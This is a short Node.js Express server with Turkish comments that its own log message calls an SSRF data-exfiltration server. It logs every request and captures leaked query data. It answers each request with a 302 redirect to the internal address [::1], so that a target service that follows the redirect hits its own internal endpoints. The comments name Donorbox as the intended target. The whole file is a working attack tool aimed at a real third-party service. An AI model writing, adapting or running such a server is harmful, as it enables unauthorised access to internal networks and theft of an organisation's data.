const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// TÜM GELEN İSTEKLERİ YAKALAYAN VE İÇ AĞA YÖNLENDİRİp VERİ ÇEKMEYE ÇALIŞAN KISIM
app.use(async (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for'] || 
                     req.socket.remoteAddress;

    console.log('\n' + '='.repeat(60));
    console.log(`[${timestamp}] 📥 İSTEK YAKALANDI!`);
    console.log(`🔹 IP Adresi     : ${clientIp}`);
    console.log(`🔹 İstek Yolu    : ${req.originalUrl}`);
    console.log(`🔹 User-Agent    : ${req.headers['user-agent'] || 'Bilinmiyor'}`);

    // Eğer istek senin sunucundan Donorbox'a gidip geri döndüyse query parametrelerini yakala
    if (req.query.data || req.query.response) {
        console.log(`🎯 SIZDIRILAN VERİ YAKALANDI! ➔`, req.query);
    }
    console.log('='.repeat(60) + '\n');

    // SENARYO A: 302 Redirect ile iç ağdaki hassas bir noktaya veya metadata'ya yönlendir
    // (Donorbox buradaki yönlendirmeyi takip ederse hedefi vuracaktır)
    const targetInternalUrl = 'http://[::1]/'; // Veya test etmek istediğin port/endpoint
    
    // Yönlendirme yanıtı dönüyoruz
    return res.redirect(302, targetInternalUrl);
});

app.listen(PORT, () => {
    console.log(`SSRF Data Exfiltration Sunucusu aktif... 🚀 (Port: ${PORT})`);
});
